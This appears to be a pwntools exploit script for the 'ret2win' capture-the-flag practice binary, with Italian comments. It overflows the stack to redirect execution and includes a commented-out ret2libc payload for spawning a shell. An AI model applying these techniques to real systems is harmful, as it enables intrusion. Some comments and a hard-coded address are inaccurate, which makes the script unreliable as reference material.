#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2win')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# p64() create una stringa già formata per little eldia 64bit
# il primo p64 serve per saltare ebx e il secondo per scrivere
# l'address di ret2win
#
# exe.symbols['main'] va a pescare i simboli dal binari, in questo
# caso funziona perché è stripped
payload = b'A' * 32 + p64(0x1234) + p64(0x40053e) + p64(0x400756)

# ROP gadget
pop_rdi = 0x4007e3
binsh = 0x7ffffffffd750# String bin/sh messa in modo manuale
system = 0x7ffff7e15bf0 # Indirizzo della funzione system() della libc

# Ottenere una shell senza ASLR
# payload = b'A' * 24 + p64(0x1234) + p64(pop_rdi) + p64(binsh) + p64(system) 

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# Pulisce l'output di uscita
# io.clean()
# manda una linea al binario
# io.sendline(b'ciao\n')

io.sendlineafter(b'> ', payload)

io.interactive()

